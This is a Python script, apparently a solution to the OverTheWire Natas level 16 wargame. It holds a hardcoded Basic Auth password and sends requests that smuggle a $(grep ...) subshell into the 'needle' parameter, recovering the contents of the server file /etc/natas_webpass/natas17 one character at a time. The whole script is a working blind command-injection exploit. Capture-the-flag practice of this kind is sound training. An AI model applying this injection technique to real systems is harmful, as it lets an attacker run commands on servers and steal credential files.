# exploit.

import requests
from requests.auth import HTTPBasicAuth

auth_data = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
word_in_server = 'bots'
password = ''
payload = ''

# solution = subshell.
# needle = $(grep -E ^<password> + <character>.*$ /etc/natas_webpass/natas17)

for number in range(0,32): # len(password) = 32
    for character in characters: 
        r = requests.post('http://natas16.natas.labs.overthewire.org/?needle=bots$(grep -E ^' + password + character + '.*$ /etc/natas_webpass/natas17)',
                           auth = auth_data)
        
        # Important Note: 
        # If we get an output response for <word_to_search>, then this means the password 
        # doesn't start with the <character> existing in the payload string. If we don't, then 
        # we are in the right path finding a character in every iteration for the password.

        if not word_in_server in r.text:
            password += character
            print("[-] Found -> " + str(password))
            break


print("[*] The password for natas17 is: " + str(password))

